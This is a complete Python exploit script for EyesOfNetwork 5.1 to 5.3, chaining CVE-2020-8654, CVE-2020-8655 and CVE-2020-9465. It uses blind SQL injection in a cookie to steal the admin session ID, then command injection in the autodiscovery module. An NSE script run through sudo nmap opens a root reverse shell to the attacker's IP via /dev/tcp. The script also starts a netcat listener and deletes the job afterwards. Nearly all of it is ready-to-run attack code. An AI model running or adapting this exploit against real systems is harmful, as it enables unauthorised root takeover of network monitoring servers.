#!/bin/env python3
# coding: utf8
#
# Exploit Title: EyesOfNetwork 5.1 to 5.3 RCE
# Date: 03/2020
# Exploit Author: Clément Billac - Twitter: @h4knet
# Vendor Homepage: https://www.eyesofnetwork.com/
# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso
# Version: 5.1 to 5.3
# CVE : CVE-2020-8654, CVE-2020-8655, CVE-2020-9465
#
# CVE-2020-8654 - Discovery module to allows to run arbitrary OS commands
#                 We were able to run the 'id' command with the following payload in the target field : ';id #'.
#
# CVE-2020-8655 - LPE via nmap NSE script
#                 As the apache user is allowed to run nmap as root, we were able to execute arbitrary commands by providing a specially crafted NSE script.
#                 nmap version 6.40 is used and doesn't have the -c and -e options.
#
# CVE-2020-0465 - SQLi in API in Cookies 'user_id' field
#                 PoC: Cookie: user_id=1' union select sleep(3) -- ;

# Python imports
import sys, requests, json, os, argparse, socket, multiprocessing
from bs4 import BeautifulSoup

# Text colors
txt_yellow = "\033[01;33m"
txt_blue = "\033[01;34m"
txt_red = "\033[01;31m"
txt_green = "\033[01;32m"
txt_bold = "\033[01;01m"
txt_reset = "\033[00m"
txt_info = txt_blue + "[*] " + txt_reset
txt_success = txt_green + "[+] " + txt_reset
txt_warn = txt_yellow + "[!] " + txt_reset
txt_err = txt_red + "[x] " + txt_reset

# Banner
banner = (txt_bold + """
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.1 to 5.3 RCE exploit                                        |
| 03/2020 - v1.0 - Clément Billac - \033[01;34mTwitter: @h4knet\033[00m                          |
|                                                                             |
| Examples:                                                                   |
| eonrce.py -h                                                                |
| eonrce.py http(s)://EyesOfNetwork-URL                                       |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
+-----------------------------------------------------------------------------+
""" + txt_reset)

# Arguments Parser
parser = argparse.ArgumentParser("eonrce", formatter_class=argparse.RawDescriptionHelpFormatter, usage=banner)
parser.add_argument("URL", metavar="URL", help="URL of the EyesOfNetwork server")
parser.add_argument("-ip", metavar="IP", help="Local IP to receive reverse shell", default='192.168.30.112')
parser.add_argument("-port", metavar="Port", type=int, help="Local port to listen", default=8081)
parser.add_argument("-sleep", metavar="Sleep", type=int, help="SQL Sleep value ", default=1)
args = parser.parse_args()
sleep = args.sleep

# HTTP Requests config
requests.packages.urllib3.disable_warnings()
baseurl = sys.argv[1].strip('/')
url = baseurl
useragent = 'Mozilla/5.0 (Windows NT 2.0; WOW64; rv:13.37) Gecko/20200104 Firefox/13.37'

# Executed command
# The following payload performs both the LPE and the reverse shell in a single command.
# It creates a NSE script in /tmp/h4k wich execute /bin/sh with reverse shell and then perform the nmap scan on localhost with the created NSE script.
# Readable PoC: ;echo "local os = require \"os\" hostrule=function(host) os.execute(\"/bin/sh -i >& /dev/tcp/192.168.30.112/8081 0>&1\") end action=function() end" > /tmp/h4k;sudo /usr/bin/nmap localhost -p 1337 -script /tmp/h4k #
ip = args.ip
port = str(args.port)
cmd = '%3Becho+%22local+os+%3D+require+%5C%22os%5C%22+hostrule%3Dfunction%28host%29+os.execute%28%5C%22%2Fbin%2Fsh+-i+%3E%26+%2Fdev%2Ftcp%2F' + ip + '%2F' + port + '+0%3E%261%5C%22%29+end+action%3Dfunction%28%29+end%22+%3E+%2Ftmp%2Fh4k%3Bsudo+%2Fusr%2Fbin%2Fnmap+localhost+-p+1337+-script+%2Ftmp%2Fh4k+%23'

# Exploit banner
print (txt_bold,"""+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.1 to 5.3 RCE exploit                                        |
| 03/2020 - v1.0 - Clément Billac - \033[01;34mTwitter: @h4knet\033[00m                        |
+-----------------------------------------------------------------------------+
""", txt_reset, sep = '')

# Check if it's a EyesOfNetwork login page.
r = requests.get(baseurl, verify=False, headers={'user-agent':useragent})
if r.status_code == 200 and r.text.find('<title>EyesOfNetwork</title>') != -1 and r.text.find('form action="login.php" method="POST">') != -1:
	print(txt_info, "EyesOfNetwork login page found", sep = '')
else:
	print(txt_err, 'EyesOfNetwork login page not found', sep = '')
	quit()

# Check if application is vulnerable
cookie = {'user_id':"' union select sleep(1) -- ;"}
cookie = {'user_id':"' union select sleep(" + str(sleep) + ") -- ;"}
r = requests.get(url, verify=False, headers={'user-agent':useragent}, cookies=cookie)
if r.status_code == 200 and r.text.find('<title>EyesOfNetwork</title>') != -1 and r.elapsed.seconds >= sleep:
	print(txt_success, 'Application seems vulnerable. Time: ', txt_bold, r.elapsed.total_seconds() ,txt_reset, sep = '')
else:
	print(txt_err, 'The host seems patched or unexploitable', sep = '')
	print(txt_warn, 'Did you tried to increase the -sleep value ?', sep = '')
	quit()

# Check if the admin user has a session opened
cookie = {'user_id':"' union select if((select count(*) from sessions where user_id = 1) > 0, sleep(" + str(sleep) + "),0) -- ;"}
r = requests.get(url, verify=False, headers={'user-agent':useragent}, cookies=cookie)
if r.status_code == 200 and r.text.find('<title>EyesOfNetwork</title>') != -1 and r.elapsed.seconds >= sleep:
	print (txt_info, 'The admin user has at least one session opened', sep = '')
else:
	print(txt_err, 'The admin user has no sessions opened', sep = '')
	print(txt_warn, 'You can manually check for other users', sep = '')
	quit()

# Guess number length
length = 0
for i in range(23,32):
	cookie = {'user_id':"' union select if(length(conv((select session_id from sessions where user_id = 1 limit 1),10,2)) = " + str(i) + ", sleep(" + str(sleep) + "),0) -- ;"}
	r = requests.get(url, verify=False, headers={'user-agent':useragent}, cookies=cookie)
	if r.status_code == 200 and r.text.find('<title>EyesOfNetwork</title>') != -1 and r.elapsed.seconds >= sleep:
		print (txt_info, 'Found the admin session_id size: ', txt_bold, i, txt_reset, sep = '')
		length = i

# Guess session bit function
def guess_bit(bit):
	cookie = {'user_id':"' union select if(mid(conv((select session_id from sessions where user_id = 1 limit 1),10,2)," + str(bit+1) + ",1), sleep(" + str(sleep) + "),0) -- ;"}
	r = requests.get(url, verify=False, headers={'user-agent':useragent}, cookies=cookie)
	if r.status_code == 200 and r.text.find('<title>EyesOfNetwork</title>') != -1 and r.elapsed.seconds >= sleep:
		return 1
	else:
		return 0

# Guessing each bit
bits = [2] * length
for i in range(0,length): bits[i] = i
pool = multiprocessing.Pool(10)
res = pool.map(guess_bit,bits)

# Compute the result
num = ''
for i in range(len(res)): num += str(res[i])
session_id = int(num, base=2)
print(txt_success, 'Obtained admin session ID: ', txt_bold, session_id ,txt_reset, sep = '')

# Creating AutoDiscovery job
url = baseurl + '/lilac/autodiscovery.php'
job_command = 'request=autodiscover&job_name=Internal+discovery&job_description=Internal+EON+discovery+procedure.&nmap_binary=%2Fusr%2Fbin%2Fnmap&default_template=&target%5B2%5D=' + cmd
cookie = {'session_id': str(session_id) + "; user_name=admin; user_id=1; group_id=1;"}
r = requests.post(url, verify=False, headers={'user-agent':useragent,'Content-Type':'application/x-www-form-urlencoded'}, cookies=cookie, data=job_command)
if r.status_code == 200 and r.text.find('Starting...') != -1:
        job_id = str(BeautifulSoup(r.content, "html.parser").find(id="completemsg")).split('?id=', 1)[1].split('&amp;rev')[0]
        print(txt_success, 'Discovery job successfully created with ID: ', txt_bold, job_id, txt_reset, sep = '')
else:
        print(txt_err, 'Error while creating the discovery job', sep = '')
        quit()

# Launching listener
print(txt_info, 'Spawning netcat listener:', txt_bold)
nc_command = '/usr/bin/nc -lnvp' + port + ' -s ' + ip
os.system(nc_command)
print(txt_reset)

# Removing job
url = baseurl + '/lilac/autodiscovery.php?id=' + job_id + '&delete=1'
r = requests.get(url, verify=False, headers={'user-agent':useragent}, cookies=cookie)
if r.status_code == 200 and r.text.find('Removed Job') != -1:
        print(txt_info, 'Job ', job_id, ' removed', sep = '')
else:
        print(txt_err, 'Error while removing the job', sep = '')
        quit()
